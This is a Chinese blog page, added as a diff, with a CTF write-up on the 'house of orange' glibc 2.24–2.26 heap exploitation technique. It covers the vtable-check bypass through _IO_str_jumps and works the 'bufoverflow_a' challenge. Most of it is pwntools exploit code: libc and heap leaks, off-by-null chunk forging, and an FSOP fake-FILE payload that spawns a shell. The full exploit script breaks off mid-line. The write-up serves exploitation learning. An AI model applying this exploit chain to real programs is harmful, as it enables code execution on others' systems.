@@ -1,0 +1,747 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/wod.jpg">
+  <link rel="icon" href="/img/wod.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CH13hh">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="glibc.2.24-2.26——house of orange上次说到glibc2.23的house of orange 以及相关的FSOP手法，由于在glibc2.24之后加入了对vtable的检查，导致之前那种方法失效，2.24的检查是IO_validate_vtable要求我们的vtable必须在__stop___libc_IO_vtables和__start___libc_IO_vtab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="glibc.2.24-2.26——house of orange">
+<meta property="og:url" content="https://ch13hh.github.io/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/index.html">
+<meta property="og:site_name" content="CH13hh">
+<meta property="og:description" content="glibc.2.24-2.26——house of orange上次说到glibc2.23的house of orange 以及相关的FSOP手法，由于在glibc2.24之后加入了对vtable的检查，导致之前那种方法失效，2.24的检查是IO_validate_vtable要求我们的vtable必须在__stop___libc_IO_vtables和__start___libc_IO_vtab">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ch13hh.github.io/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801105317095.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801111925028.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801112328481.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801112556176.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801112727430.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801112820737.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801113217034.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801113227238.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801113632295.png">
+<meta property="article:published_time" content="2024-08-01T02:39:59.000Z">
+<meta property="article:modified_time" content="2024-08-02T12:04:19.507Z">
+<meta property="article:author" content="CH13hh">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ch13hh.github.io/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801105317095.png">
+  
+  
+  
+  <title>glibc.2.24-2.26——house of orange - CH13hh</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ch13hh.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"AWdKxtM41CcPxu2EZoBdWpas-gzGzoHsz","app_key":"idRJngxDPrsuLA4G1dKyEewP","server_url":"https://awdkxtm4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>CH13hh</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/zhuye.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="glibc.2.24-2.26——house of orange"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-01 10:39" pubdate>
+          2024年8月1日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">glibc.2.24-2.26——house of orange</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="glibc-2-24-2-26——house-of-orange"><a href="#glibc-2-24-2-26——house-of-orange" class="headerlink" title="glibc.2.24-2.26——house of orange"></a><strong>glibc.2.24-2.26——house of orange</strong></h2><p>上次说到glibc2.23的house of orange 以及相关的FSOP手法，由于在glibc2.24之后加入了对vtable的检查，导致之前那种方法失效，2.24的检查是<code>IO_validate_vtable</code>要求我们的<code>vtable</code>必须在<code>__stop___libc_IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间，所以我们之前伪造在heap上的方法<strong>就失效了</strong>，但是仍然有新的方法去绕过这个检查</p>
+<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a><strong>方法</strong></h3><p>使用 vtable 内的地址来作为 vtable 的地址，大致可以分为两个结构体_IO_str_jumps 或 _IO_wstr_jumps ，他们都会调用 _IO_str_overflow，以  _IO_str_jumps 为例</p>
+<p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801105317095.png" srcset="/img/loading.gif" lazyload alt="image-20240801105317095"></p>
+<p>注意看它会调用 _IO_str_finnish </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_str_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>注意看它在一定条件的时候会把_IO_buf_base 当做参数并调用   (_IO_strfile *) fp)-&gt;_s._free_buffer)指针所指地址,在GDB分析得此处地址就是fp+0xe8处的位置，那么把此处伪造成_IO_str_jumps-8的位置，那么在调用   _IO_overflow的时候就会调用到 _IO_str_finnish ，那么把fp+0xe8处的地址放上system，  _IO_buf_base 处的地址放上 &#x2F;bin&#x2F;sh地址，那么也可以实现调用system来获取shell，不过要注意，2.24之后我们不能直接放入&#x2F;bin&#x2F;sh字符串了，而是要用libc里面的&#x2F;bin&#x2F;sh地址，不过这次我们不用泄露heap地址了，但是对于有些题目还是需要的，比如接下来的这道题目。</p>
+<h3 id="题目演示"><a href="#题目演示" class="headerlink" title="题目演示"></a>题目演示</h3><h4 id="程序保护情况"><a href="#程序保护情况" class="headerlink" title="程序保护情况"></a><strong>程序保护情况</strong></h4><p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801111925028.png" srcset="/img/loading.gif" lazyload alt="image-20240801111925028"></p>
+<h3 id="64位ida逆向"><a href="#64位ida逆向" class="headerlink" title="64位ida逆向"></a><strong>64位ida逆向</strong></h3><p>菜单</p>
+<p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801112328481.png" srcset="/img/loading.gif" lazyload alt="image-20240801112328481"></p>
+<p>add函数，申请堆块有个数限制，并且前两个使用malloc申请后来都使用，calloc申请，也就是意味着，我们要泄露地址只能靠前面两个堆块</p>
+<p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801112556176.png" srcset="/img/loading.gif" lazyload alt="image-20240801112556176"></p>
+<p>free函数，指针清空，没有UAF</p>
+<p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801112727430.png" srcset="/img/loading.gif" lazyload alt="image-20240801112727430"></p>
+<p>show函数，存在00截断</p>
+<p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801112820737.png" srcset="/img/loading.gif" lazyload alt="image-20240801112820737"></p>
+<p>edit函数，不幸的是我们只能编辑最后申请的堆块，但是存在off_by_null 漏洞</p>
+<p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801113217034.png" srcset="/img/loading.gif" lazyload alt="image-20240801113217034"></p>
+<p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801113227238.png" srcset="/img/loading.gif" lazyload alt="image-20240801113227238"></p>
+<p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801113632295.png" srcset="/img/loading.gif" lazyload alt="image-20240801113632295"></p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>1.泄露libc地址，这个好办，因为前两个是通过malloc申请的，本地环境是glibc2.24，所以我们申请unsortbin堆块范围大小，然后释放掉这样堆块上会有残留的地址，之后申请回来然后show就可以得到libc地址</p>
+<p>2.泄露heap地址，这题是2.24版本，house of orange 不需要heap地址啊，为什么要泄露？？因为此题也没有溢出，那么我们想要溢出那么就要实现堆块重叠，然后修改到unsortbin的指针，那么我们就要伪造unsortbin堆块，再利用off_by_null实现堆块合并topchunk的前移，那么就需要伪造fd,bk指针，所以要泄露heap地址，那么该怎么泄露呢，因为不能溢出所以unsrotbin attack方法自然不能用了，所以可以利用largebin 来泄露，让释放堆块残留的fd_nextsize指针来泄露heap地址，因为calloc在申请堆块的时候会清空堆块内容所以我们让topchunk将所有的堆块合并，此时largebin那些残留的地址还留在堆块上，然后此时申请比第一个申请堆块（泄露libc_地址大0x10）的堆块，因为此时数据区域指向fd_nextsize处，所以此时再次申请一个堆块就可以泄露出heap地址</p>
+<p>3.接下来利用off_by_null来伪造堆块，因为我们要达到堆块重叠</p>
+<p>4.由于calloc申请堆块会清空堆块内容所以要恢复堆块头</p>
+<p>5.绕过libc检查，及构造两个fake_chunk大小加起来和大chunk大小一样</p>
+<p>6.FSOP</p>
+<h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a><strong>泄露libc地址</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py">add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0</span><br>show()<br>io.recv(<span class="hljs-number">1</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - (<span class="hljs-number">0x000076ec9e399b58</span> - <span class="hljs-number">0x76ec9e399af0</span>) - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>_IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="泄露heap地址"><a href="#泄露heap地址" class="headerlink" title="泄露heap地址"></a><strong>泄露heap地址</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py">add(<span class="hljs-number">0x400</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>gdb.attach(io)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x500</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x90</span>)<br>add(<span class="hljs-number">0x80</span>)<br><br>show()<br>io.recvuntil(<span class="hljs-string">&#x27;\x20&#x27;</span>)<br>heap_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0xb0</span><br>success(<span class="hljs-string">&#x27;heap_addr-----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_addr))<br></code></pre></td></tr></table></figure>
+
+<h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off_by_null"></a><strong>off_by_null</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py">free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment">#0</span><br><br>fake_chunk = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>fake_chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x1E1</span>)<br>fake_chunk += p64(heap_addr + <span class="hljs-number">0x50</span>)*<span class="hljs-number">2</span><br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x1E0</span>)<br><br>edit(fake_chunk)<br><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br><br>edit(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0xf0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x88</span>)<br>edit(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x270</span>))<br>free(<span class="hljs-number">2</span>)<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="恢复堆块结构"><a href="#恢复堆块结构" class="headerlink" title="恢复堆块结构"></a><strong>恢复堆块结构</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py">add(<span class="hljs-number">0x290</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x1d0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) +<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(payload)<br><span class="hljs-comment">#gdb.attach(io)</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a><strong>绕过检查</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">add(<span class="hljs-number">0x290</span>) <span class="hljs-comment">#1</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x151</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(payload)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>add(<span class="hljs-number">0x290</span>)<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a><strong>FSOP</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py">add(<span class="hljs-number">0x290</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>file = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + p64(<span class="hljs-number">0</span>) + p64(_IO_list_all - <span class="hljs-number">0x10</span>)<br>file += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">110</span>) +p64(<span class="hljs-number">0xdeadbeef</span>) + p64(binsh)<br>file = file.ljust(<span class="hljs-number">0xD8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>file += p64(_IO_str_jumps - <span class="hljs-number">0x8</span>)<br>file +=  p64(<span class="hljs-number">0</span>) + p64(system) +<span class="hljs-string">b&#x27;\n&#x27;</span><br>payload += file<br>edit(payload)<br>add(<span class="hljs-number">0x90</span>)<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a><strong>EXP</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./bufoverflow_a&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,msg)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    io.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0</span><br>add(<span 